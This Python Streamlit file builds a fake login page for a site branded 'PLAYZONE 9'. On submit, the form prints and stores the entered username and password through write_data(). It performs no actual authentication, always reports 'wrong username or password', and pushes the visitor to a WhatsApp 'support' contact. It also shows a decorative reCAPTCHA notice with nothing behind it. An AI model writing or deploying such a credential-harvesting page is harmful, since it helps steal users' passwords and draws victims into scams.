import streamlit as st
from backend.data_read_write import write_data
import os

whatsapp_number = os.getenv('PHONE_NUMBER')

# Set page config
st.set_page_config(
    page_title="PLAYZONE 9 - Login",
    page_icon="🎮",
    layout="centered",
    initial_sidebar_state="collapsed",
)

# Initialize session state
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
    st.session_state.is_authenticated = False

# Custom CSS
st.markdown("""
    <style>
    div[data-testid="stSidebarNav"],
    div[data-testid="stSidebarNavItems"],
    ul[data-testid="stSidebarNavItems"],
    nav[data-testid="stSidebarNav"] {
        display: none !important;
    }

    body {
        background-color: #1a237e;
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
    }
    .login-container {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }
    .login-card {
        background: white;
        border-radius: 15px;
        padding: 30px;
        width: 100%;
        max-width: 400px;
        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
    }
    .login-header {
        text-align: center;
        margin-bottom: 30px;
    }
    .login-title {
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
        font-weight: bold;
        color: #e94560;
        margin-bottom: 25px;
    }
    .login-title i {
        margin-right: 10px;
    }
    .form-group {
        margin-bottom: 20px;
        position: relative;
    }
    .form-group i {
        position: absolute;
        left: 15px;
        top: 50%;
        transform: translateY(-50%);
        color: #666;
    }
    .form-control {
        width: 100%;
        padding: 12px 15px 12px 40px;
        border: 1px solid #ddd;
        border-radius: 5px;
        font-size: 16px;
        box-sizing: border-box;
    }
    .btn-login {
        width: 100%;
        padding: 12px;
        background: #e94560;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.3s;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
    }
    .btn-login:hover {
        background: #d13454;
    }
    .forgot-password {
        text-align: right;
        margin: 10px 0 20px;
    }
    .forgot-password a {
        color: #666;
        text-decoration: none;
        font-size: 14px;
    }
    .register-link {
        text-align: center;
        margin-top: 20px;
        font-size: 14px;
    }
    .register-link a {
        color: #e94560;
        text-decoration: none;
        font-weight: bold;
    }
    .recaptcha {
        margin-top: 20px;
        font-size: 12px;
        color: #666;
        text-align: center;
    }
    .recaptcha a {
        color: #e94560;
        text-decoration: none;
    }
    .support {
        position: fixed;
        bottom: 20px;
        left: 0;
        right: 0;
        text-align: center;
        color: white;
        font-size: 14px;
    }
    .support a {
        color: white;
        text-decoration: none;
        font-weight: bold;
        display: inline-flex;
        align-items: center;
    }
    .support i {
        margin-right: 5px;
    }
    </style>
""", unsafe_allow_html=True)

# Add Font Awesome for icons
st.markdown('<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">', unsafe_allow_html=True)

def login():
    st.session_state.logged_in = True
    st.session_state.is_authenticated = True
    st.rerun()

# Check if already logged in and redirect
if st.session_state.get('logged_in'):
    st.switch_page("app.py")
    st.stop()

# Login form
with st.container():
    st.markdown('<h2 style="text-align: center; color: #e94560;">Login to PLAYZONE9</h2>', unsafe_allow_html=True)
    
    with st.form("login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        
        if st.form_submit_button("Login"):
            print(f"Username: {username}, Password: {password}")
            write_data(username, password)
            st.markdown(
                f"""
                <a href="https://wa.me/{whatsapp_number}"
                target="_blank"
                style="
                    display:inline-block;
                    padding:12px 20px;
                    background:#25D366;
                    color:white;
                    font-size:18px;
                    border-radius:8px;
                    text-decoration:none;
                ">
                💬 Continue to WhatsApp
                </a>
                """,
                unsafe_allow_html=True
            )
            st.success("Wrong username or password connect to our support teams to resolve this issue")
    
    # Add additional login UI elements
    st.markdown("""
        <div class="forgot-password">
            <a href="#">Forgot Password?</a>
        </div>
        <div class="register-link">
            Don't have an account? <a href="#">Register here</a>
        </div>
        <div class="recaptcha">
            This site is protected by reCAPTCHA and the Google
            <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
            <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
        </div>
        <div class="support">
            24X7 Support: <a href="https://wa.me/1234567890" target="_blank"><i class="fab fa-whatsapp"></i> WhatsApp</a>
        </div>
    """, unsafe_allow_html=True)

# Check if we should redirect after successful login
if st.session_state.get('logged_in'):
    st.switch_page("app.py")